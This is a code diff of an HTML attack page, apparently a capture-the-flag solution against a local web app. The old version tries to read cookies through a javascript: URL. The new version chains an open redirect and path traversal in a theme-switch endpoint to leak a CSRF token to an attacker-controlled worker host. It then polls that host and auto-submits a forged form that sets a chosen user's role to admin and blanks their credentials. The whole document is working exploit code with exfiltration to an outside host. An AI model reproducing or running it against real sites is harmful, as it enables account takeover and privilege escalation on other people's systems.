@@ -1,13 +1,59 @@
 <!doctype html>
 <meta charset="utf-8">
+<body>
 <script>
-const w = window.open("http://ritual-app:5000/nope", "_blank");
+const params = new URLSearchParams(location.search);
+const userId = params.get('uid');
+const worker = params.get('w');
+const sid = crypto.randomUUID();
 
-let c = 0;
-const t = setInterval(() => {
-  try {
-    w.location = "javascript:console.log(document.cookie)";
-  } catch (e) {}
-  if (++c > 15) clearInterval(t);
-}, 200);
+function openVictim() {
+  const theme =
+    '../../../switch_theme?theme=light&redirect_path=//' +
+    new URL(worker).host +
+    '/css?id=' + encodeURIComponent(sid) + '%26x=';
+
+  const url =
+    'http://localhost:5000/switch_theme?theme=' +
+    encodeURIComponent(theme) +
+    '&redirect_path=/edit_user';
+
+  window.open(url, '_blank');
+}
+
+async function poll() {
+  for (;;) {
+    const r = await fetch(worker + '/token?id=' + encodeURIComponent(sid), {cache:'no-store'});
+    const data = await r.json();
+    if (data.token && data.token.length >= 91) {
+      const f = document.createElement('form');
+      f.method = 'POST';
+      f.action = 'http://localhost:5000/edit_user';
+
+      const fields = {
+        user_id: userId,
+        username: '',
+        password: '',
+        role: 'admin',
+        csrf_token: data.token,
+      };
+
+      for (const [k, v] of Object.entries(fields)) {
+        const i = document.createElement('input');
+        i.type = 'hidden';
+        i.name = k;
+        i.value = v;
+        f.appendChild(i);
+      }
+      document.body.appendChild(f);
+      f.submit();
+      return;
+    }
+    await new Promise(r => setTimeout(r, 80));
+  }
+}
+
+openVictim();
+poll();
 </script>
+</body>
